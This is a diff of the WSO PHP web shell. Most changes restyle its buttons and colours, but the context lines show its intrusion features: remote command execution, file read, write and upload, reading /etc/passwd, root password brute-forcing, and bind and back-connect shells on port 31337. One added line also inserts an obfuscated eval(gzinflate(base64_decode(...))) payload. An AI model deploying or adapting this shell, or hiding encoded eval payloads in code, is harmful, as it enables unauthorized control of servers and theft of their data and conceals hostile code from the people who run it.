@@ -29,7 +29,7 @@ if(get_magic_quotes_gpc()) {
 }
  
 function wsoLogin() {
-    die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
+    die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='Go'></form></pre>");
 }
  
 function WSOsetcookie($k, $v) {
@@ -269,8 +269,8 @@ pre{font-family:Courier,Monospace;}
         if(is_dir($drive.':\\'))
             $drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
     }
-    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
-       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="' . $explink . '" target=_blank>[exploit-db.com]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=green><b>OFF</b></font>')
+    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span><font color=#ecf0f1>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
+       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="' . $explink . '" target=_blank>[exploit-db.com]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=#c0392b>ON</font>':'<font color=#27ae60><b>OFF</b></font>')
        . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . wsoViewSize($totalSpace) . ' <span>Free:</span> ' . wsoViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. wsoPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>'
        . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>'
        . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';eval(gzinflate(base64_decode('dZJNc5swEIb/iieTQ3ITuInLZHrAuBIrx9SA+dLFAxbBssRHQxMX//qqJk4y0+lhR6PZffTuu6vrrn3+tS1Ew7d88m1yRV3W7UyFssG2wAmefGStQ6RwMlAzT72OuyuRbnrPqVUNTiV5rU55GhxggXQ9iGU4ny38ttLsWE9Wlc5Vq4VmhF1d3i+mUK1DW6aGhyPFdPQikrG3MQKcIvw9wDDqnBmuMn2CY//DhDiIImzBxvAiUOii3RV1e67/q02xtQlimugoQFEcxTGOjOApjin9xKAspQ1L/TOzq/GUp7RnJD4UZqCWTjBlCbxQol5yIS/MT54ERvGmA0r3qbyWJb97IHvEXfv+cfgqOcEDM2MEhN59zMUa4PDmj9BX5sqLP+E3cfND2P/l1oQOawFjD+S8hz1LjCN3ZTvOSnbg9pVPjH2eHFuosxNbzE+rKTV12DmxUJHgrnDutDckHt99HGVWW7IM5Qxc5DmNjjrud2ZUlYP9vuvl0I95OT8xfS9M6zlPohaacbelgP7jH8nZ1cOkfM3VTZH35f2XLS93LS9vrj/9vNvbhz8= ')));
@@ -282,19 +282,19 @@ function wsoFooter() {
 </div>
 <table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
     <tr>
-        <td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='>>'></form></td>
-        <td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
+        <td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='Go'></form></td>
+        <td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='Go'></form></td>
     </tr><tr>
-        <td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
-        <td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
+        <td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=submit value='Go'></form></td>
+        <td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='Go'></form></td>
     </tr><tr>
-        <td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
+        <td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='Go'></form></td>
         <td><form method='post' ENCTYPE='multipart/form-data'>
         <input type=hidden name=a value='FilesMAn'>
         <input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
         <input type=hidden name=p1 value='uploadFile'>
         <input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-        <span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
+        <span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='Go'></form><br  ></td>
     </tr></table></div></body></html>";
 }
  
@@ -364,11 +364,11 @@ function wsoPerms($p) {
  
 function wsoPermsColor($f) {
     if (!@is_readable($f))
-        return '<font color=#FF0000>' . wsoPerms(@fileperms($f)) . '</font>';
+        return '<font color=#e74c3c>' . wsoPerms(@fileperms($f)) . '</font>';
     elseif (!@is_writable($f))
-        return '<font color=white>' . wsoPerms(@fileperms($f)) . '</font>';
+        return '<font color=#ecf0f1>' . wsoPerms(@fileperms($f)) . '</font>';
     else
-        return '<font color=#25ff00>' . wsoPerms(@fileperms($f)) . '</font>';
+        return '<font color=#2ecc71>' . wsoPerms(@fileperms($f)) . '</font>';
 }
  
 function wsoScandir($dir) {
@@ -451,7 +451,7 @@ function actionSecInfo() {
                 echo '<br/>';
                 wsoSecParam('HDD space', wsoEx('df -h'));
                 wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
-                echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
+                echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value="Go"></form>';
                 if (isset ($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {
                     $temp = "";
                     for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
@@ -698,7 +698,7 @@ echo "<script>
     echo "</select>&nbsp;";
     if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
         echo "file name: <input type=text name=p2 value='wso_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
-    echo "<input type='submit' value='>>'></td></tr></form></table></div>";
+    echo "<input type='submit' value='Go'></td></tr></form></table></div>";
     wsoFooter();
 }
  
@@ -747,7 +747,7 @@ function actionStringTools() {
     echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
     foreach($stringTools as $k => $v)
         echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
-        echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
+        echo "</select><input type='submit' value='Go'/> <input type=checkbox name=ajax value=1 ".(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
     if(!empty($_POST['p1'])) {
         if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
     }
@@ -756,7 +756,7 @@ function actionStringTools() {
             <tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
             <tr><td>Path:</td><td><input type='text' name='cwd' value='". htmlspecialchars($GLOBALS['cwd']) ."' style='width:100%'></td></tr>
             <tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
-            <tr><td></td><td><input type='submit' value='>>'></td></tr>
+            <tr><td></td><td><input type='submit' value='Go'></td></tr>
             </table></form>";
  
     function wsoRecursiveGlob($path) {
@@ -853,7 +853,7 @@ function actionFilesTools() {
             break;
         case 'highlight':
             if( @is_readable($_POST['p1']) ) {
-                echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
+                echo '<div class=ml1 style="background-color: #bdc3c7;color:black;">';
                 $code = @highlight_file($_POST['p1'],true);
                 echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
             }
@@ -867,7 +867,7 @@ function actionFilesTools() {
                     echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
             }
             clearstatcache();
-            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
+            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value="Go"></form>';
             break;
         case 'edit':
             if( !is_writable($_POST['p1'])) {
@@ -892,7 +892,7 @@ function actionFilesTools() {
                     echo htmlspecialchars(@fread($fp, 1024));
                 @fclose($fp);
             }
-            echo '</textarea><input type=submit value=">>"></form>';
+            echo '</textarea><input type=submit value="Go"></form>';
             break;
         case 'hexdump':
             $c = @file_get_contents($_POST['p1']);
@@ -916,7 +916,7 @@ function actionFilesTools() {
                     $h[2] .= "\n";
                 }
             }
-            echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
+            echo '<table cellspacing=1 cellpadding=5 bgcolor=#2c3e50><tr><td bgcolor=#34495e><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
             break;
         case 'rename':
             if( !empty($_POST['p3']) ) {
@@ -925,7 +925,7 @@ function actionFilesTools() {
                 else
                     die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
             }
-            echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
+            echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value="Go"></form>';
             break;
         case 'touch':
             if( !empty($_POST['p3']) ) {
@@ -938,7 +938,7 @@ function actionFilesTools() {
                 } else echo 'Bad time format!';
             }
             clearstatcache();
-            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
+            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value="Go"></form>';
             break;
     }
     echo '</div>';
@@ -1008,7 +1008,7 @@ function add(cmd) {
         echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
     }
      
-    echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
+    echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="Go"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
     if(!empty($_POST['p1'])) {
         echo htmlspecialchars("$ ".$_POST['p1']."\n".wsoEx($_POST['p1']));
     }
@@ -1114,7 +1114,7 @@ function actionBruteforce() {
         .'<td><input type=text name=login value="root"></td></tr>'
         .'<tr><td><span>Dictionary</span></td>'
         .'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
-        .'</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
+        .'</td></tr><tr><td></td><td><input type=submit value="Go"></td></tr></form></table>';
     echo '</div><br>';
     wsoFooter();
 }
@@ -1350,7 +1350,7 @@ echo ">PostgreSql</option></select></td>
     }else
         echo $tmp;
     echo "</td>
-                <td><input type=submit value='>>' onclick='fs(d.sf);'></td>
+                <td><input type=submit value='Go' onclick='fs(d.sf);'></td>
                 <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td>
             </tr>
         </table>
@@ -1448,7 +1448,7 @@ echo ">PostgreSql</option></select></td>
             if($_POST['type']=='mysql') {
                 $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                 if($db->fetch())
-                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
+                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='Go'></form>";
             }
             if(@$_POST['p1'] == 'loadfile') {
                 $file = $db->loadFile($_POST['p2']);
@@ -1467,11 +1467,11 @@ function actionNetwork() {
     echo "<h1>Network tools</h1><div class=content>
     <form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
     <span>Bind port to /bin/sh [perl]</span><br/>
-    Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
+    Port: <input type='text' name='port' value='31337'> <input type=submit value='Go'>
     </form>
     <form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
     <span>Back-connect  [perl]</span><br/>
-    Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
+    Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='31337'> <input type=submit value='Go'>
     </form><br>";
     if(isset($_POST['p1'])) {
         function cf($f,$t) {
